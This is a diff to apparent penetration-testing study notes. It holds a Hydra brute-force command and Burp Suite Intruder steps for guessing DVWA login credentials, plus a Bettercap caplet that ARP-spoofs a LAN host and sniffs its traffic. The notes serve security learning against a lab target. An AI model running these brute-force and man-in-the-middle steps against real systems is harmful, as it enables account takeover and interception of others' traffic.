@@ -506,7 +506,6 @@ To make the pages look similar copy all the original html and css code and chang
 
 DVWA example:
 
-
 - POST (Login page of DVWA):
 
 	hydra *ip of target* http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&LOGIN=submit:Login failed" -L usernames.txt -P passwords.txt
@@ -517,3 +516,44 @@ DVWA example:
 
 
 If Hydra doesn't work it may mean enough fields have not been specified. For example, the cookie value.
+
+## Burpsuite Intruder
+
+*Intruder tab in Burpsuite*
+The community version of burpsuite is not as fast as the pro version.
+
+DVWA example:
+
+-	Intercept packet from DVWA using burpsuite
+-	In site  map : Right click the login request with username and password and "Send to intruder"
+-	Go to Intruder:Position tab.
+-	Change the attack type to Cluster Bomb (To send both username and password)
+-	Clear and then double click only username and password values and add them.
+-	Go to payloads tab
+-	If using list payload type load the list of usernames (username (payload 1) and password (payload 2) text files)
+-	Start Attack!
+
+*If there is redirection, then change under option Options tab to follow redirections to "Always".*
+
+# Man in the middle - MITM
+
+## Bettercap ARP Spoofing:
+
+- Run using : bettercap
+- Get help using : help
+
+Doing everything automatically
+
+Target ip : 192.168.1.7
+
+```
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.7
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+```
+
+- Save this to a file called : sniff.cap
+- Then : bettercap -iface eth0 -caplet sniff.cap
